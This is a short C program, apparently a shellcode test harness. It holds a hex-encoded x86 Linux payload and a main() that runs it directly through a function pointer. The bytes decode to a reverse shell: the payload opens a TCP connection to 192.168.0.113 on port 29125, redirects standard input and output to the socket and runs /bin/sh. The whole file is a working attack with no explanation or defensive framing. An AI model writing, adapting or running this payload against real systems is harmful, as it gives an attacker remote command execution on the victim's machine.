#include<stdio.h>

unsigned char shellcode[] = \
"\x31\xdb\xf7\xe3\xb0\x66\x53\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xcd\x80\x89\xc6\x31\xdb\x31\xc0\xb0\x66\x31\xc9\xb9\xc1\xa9\x01\x72\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x71\xc5\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\xb3\x03\x89\xe1\xcd\x80\x31\xdb\xf7\xe3\x31\xc9\x89\xf3\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xc2\x89\xe3\x89\xc1\xb0\x0b\xcd\x80";
int main()

{
        printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
        int (*ret)() = (int(*)())shellcode;
        ret();
}
